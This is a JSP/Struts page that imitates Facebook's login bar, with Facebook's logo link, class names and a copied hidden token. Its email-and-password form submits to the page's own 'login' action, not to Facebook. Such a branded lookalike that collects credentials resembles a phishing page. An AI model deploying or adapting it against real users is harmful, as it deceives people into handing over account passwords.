<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="css/main.css">
<title>User Register Page</title>
</head>
<body>
	<div class="_53jh">
		<div class="loggedout_menubar_container">
			<div class="clearfix loggedout_menubar">
				<div class="lfloat _ohe">
					<h1>
						<a href="https://en-gb.facebook.com/" title="Go to Facebook home"><i
							class="fb_logo img sp_ex0C8BIsLat_1_5x sx_c9e6ae"><u>Facebook</u></i></a>
					</h1>
				</div>
				<div class="menu_login_container rfloat _ohf">
					<s:form action="login">
						<input name="lsd" value="AVqu6nqk" autocomplete="off"
							type="hidden">
						<table role="presentation" cellspacing="0">
							<tbody>
								<tr>

									<td class="html7magic"><label for="email">Email or
											Phone</label></td>
									<td class="html7magic"><label for="pass">Password</label></td>
								</tr>
								<tr>
									<td><s:textfield class="inputtext" id="username" tabindex="1"
											data-testid="royal_email" type="username"
											name="userform.username"></s:textfield></td>
									<td><s:password class="inputtext" id="pass" tabindex="2"
											data-testid="royal_pass" type="password"
											name="userform.password"></s:password></td>
									<td><label class="uiButton uiButtonConfirm"
										id="loginbutton" for="u_0_5"> <s:submit value="Log In"
												tabindex="4" data-testid="royal_login_button" id="u_0_5"
												type="submit"></s:submit>



									</label></td>
								</tr>
								<tr>
									<td class="login_form_label_field"></td>
									<td class="login_form_label_field"><div>
											<a href="https://www.facebook.com/recover/initiate?lwv=110">Forgotten
												account?</a>
										</div></td>
								</tr>
							</tbody>
						</table>
						<!-- 
								<input autocomplete="off" name="timezone" value="-600"
									id="u_0_6" type="hidden">
								<input autocomplete="off" name="lgndim"
									value="eyJ3IjoxNTM2LCJoIjo4NjQsImF3IjoxNTM2LCJhaCI6ODI0LCJjIjoyNH0="
									id="u_0_7" type="hidden">
								<input name="lgnrnd" value="224417_4U3r" type="hidden">
								<input id="lgnjs" name="lgnjs" value="1506318253" type="hidden">
								<input autocomplete="off" name="ab_test_data" value=""
									type="hidden">
								<input autocomplete="off" id="locale" name="locale"
									value="en_GB" type="hidden">
								<input autocomplete="off" name="login_source"
									value="login_bluebar" type="hidden">
								<input autocomplete="off" id="prefill_contact_point"
									name="prefill_contact_point" type="hidden">
								<input autocomplete="off" id="prefill_source"
									name="prefill_source" value="mobile_subno_key" type="hidden">
								<input autocomplete="off" id="prefill_type" name="prefill_type"
									type="hidden">
								<input name="skstamp" type="hidden">
								 -->
					</s:form>
				</div>
			</div>
		</div>
	</div>

</body>
</html>